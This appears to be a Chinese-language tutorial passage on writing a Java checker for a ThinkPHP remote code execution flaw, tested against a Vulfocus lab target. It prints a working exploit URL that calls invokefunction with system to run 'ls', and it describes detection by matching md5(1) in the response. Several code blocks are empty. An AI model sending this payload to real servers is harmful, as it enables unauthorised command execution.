
**2****测试过程**

首先在pom.xml 添加 http-request

```


        <dependency>
```

使用vulfoucs创建一个漏洞场景再进行漏洞语句测试 存在漏洞

```
http://192.168.0.100:53705/?s=index/think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=system&vars\[1\]\[\]=ls
```

![](../Images/20e7ad37c14486b62b20fcee39c26bd8.png)

上最终代码

```


package exp;
```

代码看起来 很简单 就是一个url请求 响应过来的网页是否存在md5(1)的值 c4ca4238a0b923820dcc509a6f75849b 如果存在则存在漏洞。在把结果返回在文本域中。

如图
